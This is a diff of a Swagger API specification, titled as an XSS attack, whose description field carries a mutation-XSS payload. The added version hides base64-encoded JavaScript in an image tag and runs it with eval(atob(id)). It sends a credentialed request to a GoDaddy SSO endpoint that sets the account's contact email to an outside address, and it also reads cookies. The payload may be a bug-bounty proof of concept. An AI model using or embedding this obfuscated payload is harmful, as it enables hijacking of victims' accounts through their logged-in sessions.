@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img id='dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4aHIub3BlbignUE9TVCcsJ2h0dHBzOi8vc3NvLmdvZGFkZHkuY29tL3YxL2FwaS9teS9jb250YWN0L3ZhbGlkYXRpb24vY2hhbGxlbmdlLycsdHJ1ZSk7eGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHlwZScsJ2FwcGxpY2F0aW9uL2pzb24nKTt4aHIud2l0aENyZWRlbnRpYWxzPXRydWU7eGhyLm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpe2lmKHhoci5yZWFkeVN0YXRlPT09NCYmeGhyLnN0YXR1cz09PTIwMSl7YWxlcnQoeGhyLmdldEFsbFJlc3BvbnNlSGVhZGVycygpKTt9fTt4aHIuc2VuZChKU09OLnN0cmluZ2lmeSh7ImNvbnRhY3RUeXBlIjoiZW1haWwiLCJjb250YWN0VmFsdWUiOiJhbGV4YW5kcmlvQHdlYXJlaGFja2Vyb25lLmNvbSIsInVzZXJJbnRlcmFjdGlvbiI6IlBST0ZJTEVfVVBEQVRFIn0pKTsK' onerror='eval(atob(id));alert(document.cookie)' src=1>"></form>
 
   version: production
 basePath: /JSSResource/
